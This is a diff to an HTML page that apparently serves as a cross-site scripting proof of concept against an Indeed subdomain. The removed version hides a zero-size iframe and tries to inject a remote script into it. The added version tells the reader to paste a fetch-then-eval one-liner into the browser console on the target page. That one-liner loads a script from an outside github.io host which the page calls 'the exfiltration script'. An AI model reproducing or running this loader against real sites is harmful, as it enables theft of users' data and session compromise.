@@ -1,21 +1,19 @@
-<iframe
-  src="https://worker-adhoc-shifts.indeed.com"
-  style="width:0;height:0;display:none"
-  onload="inject()"
-></iframe>
-
-<script>
-function inject() {
-  const iframe = document.querySelector("iframe");
-  try {
-    const win = iframe.contentWindow;
-    const doc = win.document;
-    const s = doc.createElement("script");
-    s.src = "https://amirwilayah.github.io/indeed-xss-poc-/x.js";
-    doc.head.appendChild(s);
-  } catch (e) {
-    console.error("Injection failed:", e);
-  }
-}
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Indeed XSS PoC</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h1>Indeed XSS Proof of Concept</h1>
+  <p>This page does not exploit directly due to browser security restrictions (CSP & SOP).</p>
+  <p><strong>Paste the payload below into the browser console on the vulnerable Indeed page:</strong></p>
+  <pre><code>
+fetch("https://amirwilayah.github.io/indeed-xss-poc-/x.js")
+  .then(r => r.text())
+  .then(eval);
+  </code></pre>
+  <p>This will load <code>x.js</code> which contains the exfiltration script.</p>
+</body>
+</html>
 
